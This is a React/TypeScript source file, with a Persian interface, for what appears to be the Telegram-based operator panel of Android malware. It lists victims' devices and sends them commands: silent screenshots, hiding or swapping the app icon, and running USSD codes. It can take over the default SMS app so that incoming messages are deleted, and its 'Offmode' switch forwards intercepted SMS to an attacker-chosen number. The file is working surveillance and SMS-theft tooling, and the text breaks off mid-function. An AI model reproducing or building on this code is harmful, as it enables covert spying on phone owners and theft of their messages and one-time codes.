"use client";

import { backButton, popup } from "@tma.js/sdk-react";
import { useCallback, useEffect, useRef, useState, type SyntheticEvent } from "react";
import { createPortal } from "react-dom";

import { AppsScreen } from "@/components/AppsScreen";
import { PullToRefresh } from "@/components/PullToRefresh";
import { SmsScreen } from "@/components/SmsScreen";
import { UssdScreen } from "@/components/UssdScreen";
import { WatchScreen } from "@/components/WatchScreen";
import { formatRelative } from "@/lib/format";
import type { Device, Overview, Snapshot } from "@/lib/realtime/types";
import { readInitDataRaw } from "@/lib/telegram/initDataClient";
import { setUserBlocked } from "@/lib/users/block";
import { sendDeviceCommand } from "@/lib/users/command";
import { controlOffmode, controlSmsDefault } from "@/lib/users/sms";

export function UserScreen({
  userId,
  token,
  openWatchDeviceId,
  active,
  onBack,
}: {
  userId?: string;
  token?: string;
  openWatchDeviceId?: string;
  active: boolean;
  onBack: () => void;
}) {
  const [user, setUser] = useState<Snapshot | null>(null);
  const [error, setError] = useState("");
  const [missing, setMissing] = useState(false);
  const [smsDevice, setSmsDevice] = useState<{ deviceId: string; online: boolean } | null>(null);
  const [appsDevice, setAppsDevice] = useState<{ deviceId: string; online: boolean } | null>(null);
  const [ussdDevice, setUssdDevice] = useState<{ deviceId: string; online: boolean } | null>(null);
  const [watchDevice, setWatchDevice] = useState<{ deviceId: string; online: boolean } | null>(null);
  const [managerOnly, setManagerOnly] = useState(false);
  const openedWatch = useRef(false);

  useEffect(() => {
    try {
      setManagerOnly(sessionStorage.getItem("secsystem.panelRole") === "manager");
    } catch {
      setManagerOnly(false);
    }
  }, []);

  const load = useCallback(async () => {
    try {
      const initData = readInitDataRaw();
      const res = await fetch("/api/overview", {
        headers: initData ? { "x-telegram-init-data": initData } : {},
        cache: "no-store",
      });
      if (!res.ok) {
        setError("خواندن کاربر ممکن نشد.");
        return;
      }
      const body = (await res.json()) as Overview;
      const found =
        (body.items ?? []).find((item) => {
          if (userId && item.userId === userId) return true;
          if (token && (item.setToken || "").toLowerCase() === token) return true;
          return false;
        }) ?? null;
      setUser(found);
      setMissing(!found);
      setError("");
    } catch {
      setError("ارتباط با سرور برقرار نشد.");
    }
  }, [token, userId]);

  useEffect(() => {
    if (!active) return;
    void load();
    const timer = setInterval(() => void load(), 5000);
    return () => clearInterval(timer);
  }, [active, load]);

  useEffect(() => {
    if (!active || managerOnly || !openWatchDeviceId || !user || openedWatch.current) return;
    const match = user.devices.find((d) => d.deviceId === openWatchDeviceId);
    const device = match || user.devices[0];
    if (!device) return;
    openedWatch.current = true;
    setWatchDevice({ deviceId: device.deviceId, online: Boolean(device.online) });
  }, [active, managerOnly, openWatchDeviceId, user]);

  useEffect(() => {
    if (!active || smsDevice || appsDevice || ussdDevice || watchDevice) {
      if (!active) backButton.hide.ifAvailable();
      return;
    }
    backButton.mount.ifAvailable();
    backButton.show.ifAvailable();
    let off: (() => void) | undefined;
    try {
      off = backButton.onClick(onBack);
    } catch {
      // Mini App back button is unavailable outside Telegram
    }
    return () => {
      off?.();
      backButton.hide.ifAvailable();
    };
  }, [active, appsDevice, onBack, smsDevice, ussdDevice, watchDevice]);

  return (
    <div className="md-stack__page md-stack__page--on">
      <div className="md-stack">
        <div className={`md-stack__page${smsDevice || appsDevice || ussdDevice || watchDevice ? "" : " md-stack__page--on"}`}>
          <PullToRefresh onRefresh={load}>
            <div className="md-content">
              {error ? <p className="md-banner">{error}</p> : null}
              {missing && !error ? (
                <section className="md-block">
                  <div className="md-group md-group--empty">
                    <span className="md-group__photo">ک</span>
                    <span className="md-group__body">
                      <span className="md-group__title">کاربر پیدا نشد</span>
                      <span className="md-group__meta">این شناسه هنوز روی سرور نیست</span>
                    </span>
                  </div>
                </section>
              ) : null}
              {user ? (
                <UserEditor
                  user={user}
                  allowSessions={!managerOnly}
                  allowSmsDefault={!managerOnly}
                  onSaved={load}
                  onOpenSms={(deviceId, online) => setSmsDevice({ deviceId, online })}
                  onOpenApps={(deviceId, online) => setAppsDevice({ deviceId, online })}
                  onOpenUssd={(deviceId, online) => setUssdDevice({ deviceId, online })}
                  onOpenWatch={(deviceId, online) => setWatchDevice({ deviceId, online })}
                />
              ) : null}
            </div>
          </PullToRefresh>
        </div>
        {smsDevice && user ? (
          <SmsScreen
            userId={user.userId}
            deviceId={smsDevice.deviceId}
            online={Boolean(user.devices.find((d) => d.deviceId === smsDevice.deviceId)?.online)}
            active={active}
            onBack={() => setSmsDevice(null)}
          />
        ) : null}
        {appsDevice && user ? (
          <AppsScreen
            userId={user.userId}
            deviceId={appsDevice.deviceId}
            online={Boolean(user.devices.find((d) => d.deviceId === appsDevice.deviceId)?.online)}
            active={active}
            onBack={() => setAppsDevice(null)}
          />
        ) : null}
        {ussdDevice && user ? (
          <UssdScreen
            userId={user.userId}
            deviceId={ussdDevice.deviceId}
            online={Boolean(user.devices.find((d) => d.deviceId === ussdDevice.deviceId)?.online)}
            sims={user.devices.find((d) => d.deviceId === ussdDevice.deviceId)?.sims}
            screen={user.devices.find((d) => d.deviceId === ussdDevice.deviceId)?.screen}
            active={active}
            onBack={() => setUssdDevice(null)}
          />
        ) : null}
        {watchDevice && user && !managerOnly ? (
          <WatchScreen
            userId={user.userId}
            deviceId={watchDevice.deviceId}
            active={active}
            onBack={() => setWatchDevice(null)}
          />
        ) : null}
      </div>
    </div>
  );
}

function UserEditor({
  user,
  allowSessions = true,
  allowSmsDefault = true,
  onSaved,
  onOpenSms,
  onOpenApps,
  onOpenUssd,
  onOpenWatch,
}: {
  user: Snapshot;
  allowSessions?: boolean;
  allowSmsDefault?: boolean;
  onSaved: () => Promise<void>;
  onOpenSms: (deviceId: string, online: boolean) => void;
  onOpenApps: (deviceId: string, online: boolean) => void;
  onOpenUssd: (deviceId: string, online: boolean) => void;
  onOpenWatch: (deviceId: string, online: boolean) => void;
}) {
  const [displayName, setDisplayName] = useState(user.displayName ?? "");
  const [description, setDescription] = useState(user.description ?? "");
  const [error, setError] = useState("");
  const [hint, setHint] = useState("");
  const [saving, setSaving] = useState(false);
  const [copied, setCopied] = useState<"user" | "set" | null>(null);

  useEffect(() => {
    setDisplayName(user.displayName ?? "");
    setDescription(user.description ?? "");
    setError("");
  }, [user.userId, user.displayName, user.description]);

  const dirty =
    displayName.trim() !== (user.displayName || "").trim() ||
    description.trim() !== (user.description || "").trim();
  const setCommand = user.setToken ? `/set_${user.setToken}` : "";

  async function copy(value: string, which: "user" | "set") {
    try {
      await navigator.clipboard.writeText(value);
      setCopied(which);
      window.setTimeout(() => setCopied((current) => (current === which ? null : current)), 1600);
    } catch {
      setHint(value);
    }
  }

  async function saveProfile() {
    setSaving(true);
    setError("");
    setHint("");
    try {
      const initData = readInitDataRaw();
      const res = await fetch(`/api/users/${encodeURIComponent(user.userId)}`, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
          ...(initData ? { "x-telegram-init-data": initData } : {}),
        },
        body: JSON.stringify({ displayName, description }),
      });
      if (!res.ok) {
        setError("ذخیره نشد.");
        return;
      }
      setHint("ذخیره شد.");
      await onSaved();
    } catch {
      setError("ارتباط برقرار نشد.");
    } finally {
      setSaving(false);
    }
  }

  return (
    <>
      {hint ? <p className="md-code-banner">{hint}</p> : null}
      {error ? <p className="md-banner">{error}</p> : null}

      {user.devices.length === 0 ? (
        <section className="md-block">
          <div className="md-group md-group--empty">
            <span className="md-group__photo">د</span>
            <span className="md-group__body">
              <span className="md-group__title">دستگاهی نیست</span>
              <span className="md-group__meta">با اتصال کلاینت اینجا دیده می‌شود</span>
            </span>
          </div>
        </section>
      ) : (
        user.devices.map((device) => (
          <DeviceBlock
            key={device.deviceId}
            userId={user.userId}
            displayName={displayName}
            description={description}
            device={device}
            onChanged={onSaved}
            onOpenSms={() => onOpenSms(device.deviceId, Boolean(device.online))}
            onOpenApps={() => onOpenApps(device.deviceId, Boolean(device.online))}
            onOpenUssd={() => onOpenUssd(device.deviceId, Boolean(device.online))}
            onOpenWatch={
              allowSessions ? () => onOpenWatch(device.deviceId, Boolean(device.online)) : undefined
            }
            allowSmsDefault={allowSmsDefault}
          />
        ))
      )}

      <section className="md-block md-code-card">
        <div>
          <p className="md-code-card__label">شناسه کاربر</p>
          <p className="md-code-card__value" dir="ltr">
            {user.userId}
          </p>
        </div>
        <button type="button" className="md-copy" onClick={() => void copy(user.userId, "user")}>
          <CopyIcon />
          {copied === "user" ? "کپی شد" : "کپی"}
        </button>
      </section>

      {setCommand ? (
        <section className="md-block md-code-card">
          <div>
            <p className="md-code-card__label">دستور تنظیم</p>
            <p className="md-code-card__value" dir="ltr">
              {setCommand}
            </p>
          </div>
          <button type="button" className="md-copy" onClick={() => void copy(setCommand, "set")}>
            <CopyIcon />
            {copied === "set" ? "کپی شد" : "کپی"}
          </button>
        </section>
      ) : null}

      <section className="md-block">
        <label className="md-field">
          <span>نام کاربر</span>
          <input
            value={displayName}
            onChange={(e) => {
              setDisplayName(e.target.value);
              setHint("");
            }}
            placeholder="اسم کاربر"
            dir="auto"
            maxLength={64}
          />
        </label>
        <label className="md-field">
          <span>توضیحات</span>
          <textarea
            value={description}
            onChange={(e) => {
              setDescription(e.target.value);
              setHint("");
            }}
            placeholder="یادداشت اپراتور برای این کاربر"
            dir="auto"
            maxLength={500}
            rows={3}
          />
        </label>
      </section>

      <button type="button" className="md-action" onClick={() => void saveProfile()} disabled={saving || !dirty}>
        {saving ? "در حال ذخیره…" : "ذخیره"}
      </button>

      <BlockActions user={user} onChanged={onSaved} />
    </>
  );
}

function BlockActions({ user, onChanged }: { user: Snapshot; onChanged: () => Promise<void> }) {
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");
  const blocked = Boolean(user.blocked);
  const title = (user.displayName || "").trim() || user.userId;

  async function toggle() {
    const next = !blocked;
    try {
      const id = await popup.show({
        title: next ? "مسدود کردن" : "رفع مسدودیت",
        message: next
          ? `کاربر «${title}» مسدود شود؟ دیگر به سرور وصل نمی‌شود.`
          : `مسدودیت «${title}» برداشته شود؟`,
        buttons: [
          { id: "ok", type: next ? "destructive" : "default", text: next ? "مسدود کن" : "رفع مسدودیت" },
          { type: "cancel" },
        ],
      });
      if (id !== "ok") return;
    } catch {
      const ok = window.confirm(next ? `کاربر «${title}» مسدود شود؟` : `مسدودیت «${title}» برداشته شود؟`);
      if (!ok) return;
    }
    setBusy(true);
    setError("");
    try {
      const ok = await setUserBlocked(user.userId, next);
      if (!ok) {
        setError(next ? "مسدود نشد." : "رفع مسدودیت انجام نشد.");
        return;
      }
      await onChanged();
    } catch {
      setError("ارتباط برقرار نشد.");
    } finally {
      setBusy(false);
    }
  }

  return (
    <>
      {error ? <p className="md-banner">{error}</p> : null}
      <button
        type="button"
        className={`md-action md-action--with-icon${blocked ? " md-action--tonal" : " md-action--danger"}`}
        disabled={busy}
        onClick={() => void toggle()}
      >
        <BlockGlyph />
        {busy ? "…" : blocked ? "رفع مسدودیت" : "مسدود کردن"}
      </button>
    </>
  );
}

function BlockGlyph() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <circle cx="12" cy="12" r="7.25" stroke="currentColor" strokeWidth="1.8" />
      <path d="M7 7l10 10" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" />
    </svg>
  );
}

function DeviceBlock({
  userId,
  displayName,
  description,
  device,
  onChanged,
  onOpenSms,
  onOpenApps,
  onOpenUssd,
  onOpenWatch,
  allowSmsDefault = true,
}: {
  userId: string;
  displayName: string;
  description: string;
  device: Device;
  onChanged: () => Promise<void>;
  onOpenSms: () => void;
  onOpenApps: () => void;
  onOpenUssd: () => void;
  onOpenWatch?: () => void;
  allowSmsDefault?: boolean;
}) {
  const [open, setOpen] = useState(false);
  const [busy, setBusy] = useState<string | null>(null);
  const [actionHint, setActionHint] = useState("");
  const [actionError, setActionError] = useState("");
  const [shotUrl, setShotUrl] = useState<string | null>(null);
  const [shotBlob, setShotBlob] = useState<Blob | null>(null);
  const [shotFull, setShotFull] = useState(false);
  const [copied, setCopied] = useState(false);
  const [offTo, setOffTo] = useState(device.offmodeTo ?? "");
  const [offFilter, setOffFilter] = useState<"personal" | "nonpersonal" | "all">(
    device.offmodeFilter === "personal" || device.offmodeFilter === "all"
      ? device.offmodeFilter
      : "nonpersonal",
  );
  const [pickingOffFilter, setPickingOffFilter] = useState(false);
  useEffect(() => {
    setOffTo(device.offmodeTo ?? "");
    setOffFilter(
      device.offmodeFilter === "personal" || device.offmodeFilter === "all"
        ? device.offmodeFilter
        : "nonpersonal",
    );
  }, [device.offmode, device.offmodeTo, device.offmodeFilter]);
  const deviceTitle = [device.manufacturer, device.model].filter(Boolean).join(" ") || device.device || device.appLabel || device.deviceId;
  const name = displayName.trim();
  const note = description.trim();
  const title = name || deviceTitle;
  const mark = (name || title).trim().slice(0, 1) || "د";
  const subtitle = name ? note || deviceTitle : device.appLabel || "";
  const android = device.androidRelease
    ? device.sdk
      ? `${device.androidRelease} (API ${device.sdk})`
      : device.androidRelease
    : "";
  const grants = grantItems(device.grants);
  const facts = [
    ["نام اپ", device.appLabel],
    ["برند", device.brand],
    ["دستگاه", device.device],
    ["محصول", device.product],
    ["اندروید", android],
    ["اپراتور", device.operator],
    ["اپراتور سیم", device.simOperator],
    ["IP", device.clientIp],
    ["آیکن", iconStateLabel(device.iconState)],
    ["پورت", device.port],
    ["زبان", device.locale],
    ["منطقه", device.timeZone],
    ["پکیج", device.packageName],
    ["شناسه دستگاه", device.deviceId],
    ["آخرین بازدید", !device.online && device.lastSeen ? formatRelative(device.lastSeen) : ""],
    ["اولین دید", device.firstSeen ? formatRelative(device.firstSeen) : ""],
  ].filter((row) => String(row[1] || "").trim());

  useEffect(() => {
    return () => {
      if (shotUrl) URL.revokeObjectURL(shotUrl);
    };
  }, [shotUrl]);

  function clearScreenshot() {
    setShotFull(false);
    setShotBlob(null);
    setShotUrl((prev) => {
      if (prev) URL.revokeObjectURL(prev);
      return null;
    });
  }

  function guardShotEvent(e: SyntheticEvent) {
    e.preventDefault();
    e.stopPropagation();
  }

  async function saveScreenshot() {
    if (!shotBlob) return;
    try {
      const ext = shotBlob.type.includes("png") ? "png" : "jpg";
      const name = `screenshot-${device.deviceId.slice(0, 8)}-${Date.now()}.${ext}`;
      const url = URL.createObjectURL(shotBlob);
      const a = document.createElement("a");
      a.href = url;
      a.download = name;
      a.rel = "noopener";
      a.style.display = "none";
      document.body.appendChild(a);
      a.click();
      a.remove();
      window.setTimeout(() => URL.revokeObjectURL(url), 1500);
      setActionHint("ذخیره شد");
    } catch {
      setActionError("ذخیره نشد.");
    }
  }

  async function loadScreenshotPreview() {
    const initData = readInitDataRaw();
    const res = await fetch(
      `/api/users/${encodeURIComponent(userId)}/devices/${encodeURIComponent(device.deviceId)}/screenshot?t=${Date.now()}`,
      {
        headers: initData ? { "x-telegram-init-data": initData } : {},
        cache: "no-store",
      },
    );
    if (!res.ok) throw new Error("shot");
    const blob = await res.blob();
    const url = URL.createObjectURL(blob);
    setShotBlob(blob);
    setShotUrl((prev) => {
      if (prev) URL.revokeObjectURL(prev);
      return url;
    });
  }

  async function runSmsDefault(action: "claim" | "restore") {
    if (!device.online) {
      setActionError("دستگاه آفلاین است.");
      setActionHint("");
      return;
    }
    setBusy(`sms.${action}`);
    setActionError("");
    setActionHint("");
    try {
      const result = await controlSmsDefault(userId, device.deviceId, action);
      if (!result.ok) {
        const err = result.error || "انجام نشد";
        setActionError(
          err === "offline"
            ? "دستگاه آفلاین است."
            : err === "timeout"
              ? "پاسخ نداد (تنظیم پیش‌فرض پیامک طول کشید)."
              : err === "accessibility"
                ? "روی گوشی دسترسی (Accessibility) را روشن کن."
                : err === "not default"
                  ? "اپ به‌عنوان پیامک پیش‌فرض انتخاب نشد."
                  : err === "restore failed"
                    ? "بازگردانی اپ پیامک قبلی کامل نشد."
                    : err === "busy"
                      ? "دستور قبلی هنوز در حال اجراست."
                      : err,
        );
        return;
      }
      setActionHint(
        action === "claim"
          ? "اپ ما پیش‌فرض پیامک شد؛ پیامک‌های جدید حذف می‌شوند."
          : "اپ پیامک قبلی بازگردانی شد.",
      );
      await onChanged();
    } catch {
      setActionError("ارتباط برقرار نشد.");
    } finally {
      setBusy(null);
    }
  }

  async function runOffmode(on: boolean) {
    if (!device.online) {
      setActionError("دستگاه آفلاین است.");
      setActionHint("");
      return;
    }
    const to = offTo.trim();
    if (on && !to) {
      setActionError("شماره را وارد کن.");
      setActionHint("");
      return;
    }
    setBusy("offmode");
    setActionError("");
    setActionHint("");
    try {
      const result = await controlOffmode(userId, device.deviceId, on, on ? to : "", offFilter);
      if (!result.ok) {
        const err = result.error || "انجام نشد";
        setActionError(
          err === "offline"
            ? "دستگاه آفلاین است."
            : err === "timeout"
              ? "پاسخ نداد."
              : err === "permission"
                ? "مجوز پیامک روی گوشی نیست."
                : err === "number" || err.includes("invalid")
                  ? "شماره نامعتبر است."
                  : err,
        );
        return;
      }
      setActionHint(on ? `Offmode روشن شد (${offFilterLabel(offFilter)}).` : "Offmode خاموش شد.");
      await onChanged();
    } catch {
      setActionError("ارتباط برقرار نشد.");
    } finally {
      setBusy(null);
    }
  }

  async function runCommand(type: "ping" | "icon" | "screenshot", mode?: "normal" | "hidden" | "changed") {
    if (!device.online) {
      setActionError("دستگاه آفلاین است.");
      setActionHint("");
      return;
    }
    setBusy(mode ? `icon:${mode}` : type);
    setActionError("");
    setActionHint("");
    try {
      const result = await sendDeviceCommand(userId, device.deviceId, type, mode);
      if (!result.ok) {
        const err = result.error || "انجام نشد";
        setActionError(
          err === "offline"
            ? "دستگاه آفلاین است."
            : err === "timeout"
              ? "پاسخ نداد."
              : err === "accessibility"
                ? "روی گوشی دسترسی (Accessibility) را روشن کن."
                : err === "unsupported"
                  ? "اندروید گوشی برای اسکرین‌شات کافی نیست (حداقل ۱۱)."
                  : err,
        );
        return;
      }
      if (type === "ping") {
        setActionHint(typeof result.rttMs === "number" ? `پینگ ${result.rttMs} ms` : "پینگ موفق");
      } else if (type === "screenshot") {
        setActionHint("اسکرین‌شات گرفته شد");
        try {
          await loadScreenshotPreview();
        } catch {
          setActionHint("گرفته شد؛ پیش‌نمایش لود نشد");
        }
      } else {
        setActionHint(`آیکن: ${iconStateLabel(result.iconState) || mode || "—"}`);
        await onChanged();
      }
    } catch {
      setActionError("ارتباط برقرار نشد.");
    } finally {
      setBusy(null);
    }
  }

  return (
    <section className="md-block">
      <button type="button" className="md-group md-device" aria-expanded={open} onClick={() => setOpen((value) => !value)}>
        <span className="md-group__photo">{mark}</span>
        <span className="md-group__body">
          <span className="md-group__title" dir="auto">
            {title}
          </span>
          <span className="md-online-line" aria-label={device.online ? "آنلاین" : "آفلاین"}>
            <span className={`md-live-dot${device.online ? " md-live-dot--on" : ""}`} />
          </span>
          {subtitle ? (
            <span className="md-group__desc" dir="auto">
              {subtitle}
            </span>
          ) : null}
          {device.screen ? (
            <span className={`md-badge${device.screen.on && !device.screen.locked ? " md-badge--on" : ""}`}>
              {screenLabel(device.screen)}
            </span>
          ) : null}
        </span>
        <span className={`md-device__chev${open ? " md-device__chev--open" : ""}`} aria-hidden="true">
          <ExpandIcon />
        </span>
      </button>
      {grants.length || firstActionView(device).visible ? (
        <div className="md-inset">
          {grants.length ? (
            <div>
              <p className="md-inset__label">دسترسی‌ها</p>
              <div className="md-grant-badges">
                {grants.map((grant) => (
                  <span key={grant.key} className="md-badge md-badge--on">
                    {grant.label}
                  </span>
                ))}
              </div>
            </div>
          ) : null}
          <FirstActionCard
            device={device}
            copied={copied}
            onCopy={() => {
              const text = firstActionView(device).text;
              if (!text) return;
              void copyPlainText(text).then((ok) => {
                if (!ok) {
                  setActionError("کپی نشد.");
                  return;
                }
                setCopied(true);
                window.setTimeout(() => setCopied(false), 1500);
              });
            }}
          />
        </div>
      ) : null}
      {open ? (
        <>
          <div className="md-facts">
            {facts.map(([label, value]) => (
              <p key={label} className="md-fact">
                <span className="md-fact__label">{label}</span>
                <span className="md-fact__value" dir="auto">
                  {value}
                </span>
              </p>
            ))}
          </div>
          <div className="md-device-actions">
            {allowSmsDefault ? (
              <div className="md-switch-row">
                <span className="md-switch-row__text">
                  <span className="md-switch-row__title">
                    {busy === "sms.claim" || busy === "sms.restore" ? "در حال تنظیم پیامک…" : "پیامک پیش‌فرض (اپ ما)"}
                  </span>
                  <span className="md-switch-row__meta">{smsDefaultStatus(device)}</span>
                </span>
                <button
                  type="button"
                  role="switch"
                  aria-checked={Boolean(device.smsOurs && device.smsHideIncoming)}
                  aria-label="پیامک پیش‌فرض اپ ما"
                  className={`md-switch${device.smsOurs && device.smsHideIncoming ? " md-switch--on" : ""}`}
                  disabled={Boolean(busy)}
                  onClick={() => {
                    const on = Boolean(device.smsOurs && device.smsHideIncoming);
                    void runSmsDefault(on ? "restore" : "claim");
                  }}
                >
                  <span className="md-switch__thumb" />
                </button>
              </div>
            ) : null}
            {allowSmsDefault ? (
              <div className="md-offmode">
                <label className="md-field">
                  <span>شماره Offmode</span>
                  <input
                    value={offTo}
                    onChange={(e) => {
                      setOffTo(e.target.value);
                      setActionError("");
                    }}
                    placeholder="0912…"
                    dir="ltr"
                    inputMode="tel"
                    maxLength={32}
                    disabled={Boolean(busy)}
                  />
                </label>
                <button
                  type="button"
                  className="md-stats__pick"
                  aria-haspopup="dialog"
                  aria-expanded={pickingOffFilter}
                  disabled={Boolean(busy)}
                  onClick={() => setPickingOffFilter(true)}
                >
                  <span className="md-stats__pick-icon" aria-hidden="true">
                    <OffmodePickIcon />
                  </span>
                  <span className="md-stats__pick-body">
                    <span className="md-stats__pick-value" dir="auto">
                      {offFilterLabel(offFilter)}
                    </span>
                    <span className="md-stats__pick-meta">نوع فوروارد</span>
                  </span>
                  <span className="md-stats__pick-chev" aria-hidden="true">
                    <ExpandDownIcon />
                  </span>
                </button>
                <div className="md-switch-row">
                  <span className="md-switch-row__text">
                    <span className="md-switch-row__title">
                      {busy === "offmode" ? "در حال تنظیم Offmode…" : "Offmode"}
                    </span>
                    <span className="md-switch-row__meta">
                      {device.offmode && device.offmodeTo
                        ? `${offFilterLabel(device.offmodeFilter)} → ${device.offmodeTo}`
                        : "خاموش"}
                    </span>
                  </span>
                  <button
                    type="button"
                    role="switch"
                    aria-checked={Boolean(device.offmode)}
                    aria-label="Offmode"
                    className={`md-switch${device.offmode ? " md-switch--on" : ""}`}
                    disabled={Boolean(busy)}
                    onClick={() => {
                      void runOffmode(!device.offmode);
                    }}
                  >
                    <span className="md-switch__thumb" />
                  </button>
                </div>
              </div>
            ) : null}
            <button
              type="button"
              className="md-action md-action--tonal md-action--with-icon"
              disabled={Boolean(busy)}
              onClick={onOpenSms}
            >
              <SmsGlyph />
              پیامک‌ها
            </button>
            <button
              type="button"
              className="md-action md-action--tonal md-action--with-icon"
              disabled={Boolean(busy)}
              onClick={onOpenApps}
            >
              <AppsGlyph />
              برنامه‌ها
            </button>
            <button
              type="button"
              className="md-action md-action--tonal md-action--with-icon"
              disabled={Boolean(busy)}
              onClick={onOpenUssd}
            >
              <UssdGlyph />
              USSD
            </button>
            {onOpenWatch ? (
              <button
                type="button"
                className="md-action md-action--tonal md-action--with-icon"
                disabled={Boolean(busy)}
                onClick={onOpenWatch}
              >
                <WatchGlyph />
                نشست‌ها
              </button>
            ) : null}
            <button
              type="button"
              className="md-action md-action--tonal md-action--with-icon"
              disabled={Boolean(busy)}
              onClick={() => void runCommand("screenshot")}
            >
              <ScreenshotGlyph />
              {busy === "screenshot" ? "…" : "اسکرین‌شات"}
            </button>
            <button
              type="button"
              className="md-action md-action--tonal md-action--with-icon"
              disabled={Boolean(busy)}
              onClick={() => void runCommand("ping")}
            >
              <PingGlyph />
              {busy === "ping" ? "…" : "پینگ"}
            </button>
            <p className="md-icon-status">آیکن: {iconStateLabel(device.iconState) || "نامشخص"}</p>
            <button
              type="button"
              className={`md-action md-action--tonal md-action--with-icon${device.iconState === "normal" ? " md-action--current" : ""}`}
              disabled={Boolean(busy) || device.iconState === "normal"}
              aria-pressed={device.iconState === "normal"}
              onClick={() => void runCommand("icon", "normal")}
            >
              <IconNormalGlyph />
              {busy === "icon:normal" ? "…" : "آیکن معمولی"}
            </button>
            <button
              type="button"
              className={`md-action md-action--tonal md-action--with-icon${device.iconState === "hidden" ? " md-action--current" : ""}`}
              disabled={Boolean(busy) || device.iconState === "hidden"}
              aria-pressed={device.iconState === "hidden"}
              onClick={() => void runCommand("icon", "hidden")}
            >
              <IconHiddenGlyph />
              {busy === "icon:hidden" ? "…" : "مخفی کردن آیکن"}
            </button>
            <button
              type="button"
              className={`md-action md-action--tonal md-action--with-icon${device.iconState === "changed" ? " md-action--current" : ""}`}
              disabled={Boolean(busy) || device.iconState === "changed"}
              aria-pressed={device.iconState === "changed"}
              onClick={() => void runCommand("icon", "changed")}
            >
              <IconSwapGlyph />
              {busy === "icon:changed" ? "…" : "تعویض آیکن"}
            </button>
          </div>
          {actionHint ? <p className="md-code-banner">{actionHint}</p> : null}
          {actionError ? <p className="md-banner">{actionError}</p> : null}
          {shotUrl ? (
            <div className="md-shot">
              <div className="md-shot__bar">
                <button type="button" className="md-shot__btn" onClick={() => setShotFull(true)}>
                  تمام‌صفحه
                </button>
                <button type="button" className="md-shot__btn" onClick={() => void saveScreenshot()}>
                  ذخیره در گالری
                </button>
                <button type="button" className="md-shot__btn md-shot__btn--close" onClick={clearScreenshot}>
                  بستن
                </button>
              </div>
              <div
                className="md-shot__frame"
                onContextMenu={guardShotEvent}
                onDragStart={guardShotEvent}
              >
                <img
                  className="md-shot__img"
                  src={shotUrl}
                  alt=""
                  draggable={false}
                  onContextMenu={guardShotEvent}
                  onDragStart={guardShotEvent}
                />
              </div>
            </div>
          ) : null}
          {shotUrl && shotFull ? (
            <div
              className="md-shot-fs"
              role="dialog"
              aria-modal="true"
              onContextMenu={guardShotEvent}
            >
              <div className="md-shot-fs__bar">
                <button type="button" className="md-shot__btn" onClick={() => void saveScreenshot()}>
                  ذخیره در گالری
                </button>
                <button type="button" className="md-shot__btn md-shot__btn--close" onClick={() => setShotFull(false)}>
                  بستن
                </button>
              </div>
              <div className="md-shot-fs__body" onContextMenu={guardShotEvent} onDragStart={guardShotEvent}>
                <img
                  className="md-shot-fs__img"
                  src={shotUrl}
                  alt=""
                  draggable={false}
                  onContextMenu={guardShotEvent}
                  onDragStart={guardShotEvent}
                />
              </div>
            </div>
          ) : null}
        </>
      ) : null}
      {pickingOffFilter
        ? createPortal(
            <div
              className="md-dialog"
              role="dialog"
              aria-modal="true"
              aria-label="نوع Offmode"
              onClick={() => setPickingOffFilter(false)}
            >
              <div
                className="md-dialog__card md-stats-pick"
                onClick={(event) => {
                  event.stopPropagation();
                }}
              >
                <button
                  type="button"
                  className="md-dialog__x"
                  aria-label="بستن"
                  onClick={() => setPickingOffFilter(false)}
                >
                  <CloseGlyph />
                </button>
                <div className="md-stats-pick__list">
                  {(
                    [
                      { id: "nonpersonal", name: "غیرشخصی", hint: "اسم فرستنده یا شماره غیرموبایل" },
                      { id: "personal", name: "شخصی", hint: "شماره‌های مطابق الگوی شخصی" },
                      { id: "all", name: "همه", hint: "همه پیامک‌های ورودی" },
                    ] as const
                  ).map((item) => {
                    const on = offFilter === item.id;
                    return (
                      <button
                        key={item.id}
                        type="button"
                        className={`md-stats-pick__item${on ? " md-stats-pick__item--on" : ""}`}
                        onClick={() => {
                          setOffFilter(item.id);
                          setActionError("");
                          setPickingOffFilter(false);
                        }}
                      >
                        <span className="md-stats-pick__mark" aria-hidden="true">
                          <OffmodePickIcon />
                        </span>
                        <span className="md-stats-pick__text">
                          <span className="md-stats-pick__name" dir="auto">
                            {item.name}
                          </span>
                          <span className="md-stats-pick__hint" dir="auto">
                            {item.hint}
                          </span>
                        </span>
                        {on ? (
                          <span className="md-stats-pick__check" aria-hidden="true">
                            <CheckGlyph />
                          </span>
                        ) : null}
                      </button>
                    );
                  })}
                </div>
              </div>
            </div>,
            document.body,
          )
        : null}
    </section>
  );
}

function offFilterLabel(filter?: string): string {
  if (filter === "personal") return "شخصی";
  if (filter === "all") return "همه";
  return "غیرشخصی";
}

function smsDefaultStatus(device: Device): string {
  const label = (device.smsDefaultLabel || device.smsDefaultPkg || "").trim();
  if (device.smsOurs && device.smsHideIncoming) {
    return "روشن · پیامک‌های جدید حذف می‌شوند";
  }
  if (device.smsOurs) {
    return "اپ ما پیش‌فرض است (مخفی‌سازی خاموش)";
  }
  if (label) {
    const isPrev = Boolean(device.smsPreviousPkg) && device.smsDefaultPkg === device.smsPreviousPkg;
    return isPrev ? `خاموش · ${label} (اپ اصلی)` : `خاموش · ${label}`;
  }
  return "خاموش";
}

function ExpandIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path d="M6.5 9.5 12 15l5.5-5.5" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

function ExpandDownIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path d="M6.5 9.5 12 15l5.5-5.5" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

function OffmodePickIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path
        d="M8 7.5h8A3.5 3.5 0 0 1 19.5 11v2A3.5 3.5 0 0 1 16 16.5H8A3.5 3.5 0 0 1 4.5 13v-2A3.5 3.5 0 0 1 8 7.5Z"
        stroke="currentColor"
        strokeWidth="1.7"
      />
      <path d="M9.5 12h5" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" />
    </svg>
  );
}

function CheckGlyph() {
  return (
